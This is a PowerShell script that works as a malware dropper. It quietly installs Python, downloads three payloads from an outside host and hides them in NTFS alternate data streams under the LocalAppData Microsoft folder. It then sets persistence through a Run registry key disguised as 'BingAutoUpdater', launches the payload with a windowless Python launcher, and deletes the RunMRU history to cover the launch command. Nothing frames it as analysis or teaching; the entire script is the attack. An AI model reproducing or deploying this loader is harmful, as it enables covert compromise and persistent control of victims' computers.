# --- Set targeted file to hook other files up to 
$dir = "$env:localappdata\Microsoft"


# --- Download and install python 3.11  
$python = "installation"

iwr "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe" -OutFile "$dir:$python"
Start-Process -Wait -FilePath "$dir:$python" -ArgumentList "/quiet InstallAllUsers=0 InstallLauncherAllUsers=0 PrependPath=1 Include_test=0 Include_pip=0 Include_tcltk=0"

Remove-Item -Path "$dir:$python"


# --- Download required files
$url = "https://domain.my"

iwr "$url/assets/client" -OutFile "$dir:bockscar"
iwr "$url/assets/module" -OutFile "$dir:fatman"
iwr "$url/assets/core" -OutFile "$dir:fission"


# --- Add file to autostart and start a python process
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BingAutoUpdater" -Value "$env:localappdata\Programs\Python\Launcher\pyw.exe -3.11 $dir:bockscar" -Type String
Start-Process -FilePath "$env:localappdata\Programs\Python\Launcher\pyw.exe" -WorkingDirectory $env:localappdata -ArgumentList "-3.11 $dir:bockscar"


# --- Clean up
$MRU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"

if (Test-Path -Path $MRU) {
   Remove-Item -Path $MRU -Recurse
}
